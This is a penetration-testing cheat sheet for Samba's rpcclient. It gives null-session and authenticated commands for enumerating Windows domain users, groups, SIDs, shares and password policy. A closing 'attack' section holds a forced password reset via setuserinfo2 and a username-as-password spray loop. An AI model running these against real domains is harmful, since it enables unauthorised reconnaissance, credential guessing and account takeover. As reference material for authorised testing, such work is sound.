# Rpcclient

Samba's MS-RPC client. Most enumeration commands work over a null session (no creds) against unhardened targets, and authenticated sessions unlock the full MS-SAMR / MS-LSAT command surface. Run `rpcclient $rhost_ip -U "" -N` for an interactive shell, or use `-c "cmd;quit"` for one-shot calls.

<!-- cheat
export rpcclient_auth
var auth_method = printf 'null\tNull session (no creds)\npassword\tUse password\n' --- --delimiter '\t' --fzf-overrides "--with-nth=2 --header=Select\ authentication\ mode" --map "cut -f1"

if $auth_method == null
var auth_flags := -U "" -N
fi

if $auth_method == password
var credential --- --header "Credential"
var auth_flags := -U "$user%$credential"
fi
-->

## rpcclient - interactive

### Null session shell

Drop into rpcclient with no creds. Test target tolerance for null sessions before scripting.

```sh title:"Null-session rpcclient shell for manual enumeration"
rpcclient -U "" -N $rhost_ip
```
<!-- cheat
import domain_ip
-->

### Authenticated shell

Drop into an interactive rpcclient with valid creds. Use this for ad-hoc poking; the entries below are one-shot equivalents.

```sh title:"Authenticated rpcclient interactive shell"
rpcclient $rhost_ip $auth_flags
```
<!-- cheat
import domain_ip
import users
import rpcclient_auth
-->

## rpcclient - server info

### srvinfo

Show the target's basic server info (OS, server type flags, comment).

```sh title:"Rpcclient Show target OS and server type via srvinfo"
rpcclient $rhost_ip $auth_flags -c "srvinfo;quit"
```
<!-- cheat
import domain_ip
import users
import rpcclient_auth
-->

### querydominfo

Pull domain info (name, server count, role).

```sh title:"Rpcclient Pull domain info (name, server count, role)"
rpcclient $rhost_ip $auth_flags -c "querydominfo;quit"
```
<!-- cheat
import domain_ip
import users
import rpcclient_auth
-->

### getdompwinfo

Pull the domain password policy - run before spraying so you don't lock accounts.

```sh title:"Rpcclient Pull domain password policy before spraying"
rpcclient $rhost_ip $auth_flags -c "getdompwinfo;quit"
```
<!-- cheat
import domain_ip
import users
import rpcclient_auth
-->

### netshareenum

List shares on the target via MS-SRVS.

```sh title:"Rpcclient List shares via MS-SRVS"
rpcclient $rhost_ip $auth_flags -c "netshareenum;quit"
```
<!-- cheat
import domain_ip
import users
import rpcclient_auth
-->

## rpcclient - users & groups

### enumdomusers

Enumerate all domain users with their RIDs.

```sh title:"Rpcclient Enumerate domain users with RIDs"
rpcclient $rhost_ip $auth_flags -c "enumdomusers;quit"
```
<!-- cheat
import domain_ip
import users
import rpcclient_auth
-->

### enumdomgroups

Enumerate domain groups with their RIDs.

```sh title:"Rpcclient Enumerate domain groups with RIDs"
rpcclient $rhost_ip $auth_flags -c "enumdomgroups;quit"
```
<!-- cheat
import domain_ip
import users
import rpcclient_auth
-->

### querygroup

Show group info (name, description) for a specific RID.

```sh title:"Rpcclient Show group info for a specific RID"
rpcclient $rhost_ip $auth_flags -c "querygroup $rid;quit"
```
<!-- cheat
import domain_ip
import users
import rpcclient_auth
var rid
-->

### querygroupmem

List members of a group by RID.

```sh title:"Rpcclient List members of a group by RID"
rpcclient $rhost_ip $auth_flags -c "querygroupmem $rid;quit"
```
<!-- cheat
import domain_ip
import users
import rpcclient_auth
var rid
-->

### queryuser

Show detailed user info by RID (last logon, bad password count, UAC flags).

```sh title:"Rpcclient Show detailed user info by RID"
rpcclient $rhost_ip $auth_flags -c "queryuser $rid;quit"
```
<!-- cheat
import domain_ip
import users
import rpcclient_auth
var rid
-->

### getusrdompwinfo

Per-user password policy (PSO-aware - returns the policy that actually applies to this account).

```sh title:"Rpcclient Per-user password policy via PSO lookup"
rpcclient $rhost_ip $auth_flags -c "getusrdompwinfo $rid;quit"
```
<!-- cheat
import domain_ip
import users
import rpcclient_auth
var rid
-->

## rpcclient - LSA

### lsaenumsid

Enumerate every SID known to the local LSA - reveals well-known principals and SID-history values.

```sh title:"Rpcclient Enumerate SIDs known to local LSA"
rpcclient $rhost_ip $auth_flags -c "lsaenumsid;quit"
```
<!-- cheat
import domain_ip
import users
import rpcclient_auth
-->

### lookupsid

Translate a single SID to its principal name.

```sh title:"Rpcclient Translate SID to principal name"
rpcclient $rhost_ip $auth_flags -c "lookupsid $sid;quit"
```
<!-- cheat
import domain_ip
import users
import rpcclient_auth
var sid
-->

### lookupnames

Translate a principal name to its SID.

```sh title:"Rpcclient Translate principal name to SID"
rpcclient $rhost_ip $auth_flags -c "lookupnames $name;quit"
```
<!-- cheat
import domain_ip
import users
import rpcclient_auth
var name
-->

## rpcclient - attack

### Reset user password (setuserinfo2)

Set a target user's password via MS-SAMR. Requires `User-Force-Change-Password` extended right (or higher) on the target.

```sh title:"Rpcclient Reset user password via setuserinfo2 (needs Force-Change-Password)"
rpcclient $rhost_ip $auth_flags -c "setuserinfo2 $target_user 23 '$new_pass';quit"
```
<!-- cheat
import domain_ip
import users
import rpcclient_auth
var target_user
var new_pass
-->

### Username=password spray

Spray a userlist trying each username as its own password. Fast first check on most engagements.

```sh title:"Rpcclient Spray userlist: username == password"
for u in $(cat $users_file); do echo -n "user: $u "; rpcclient -U "$u%$u" -c "getusername;quit" $rhost_ip; done
```
<!-- cheat
import domain_ip
var users_file
-->
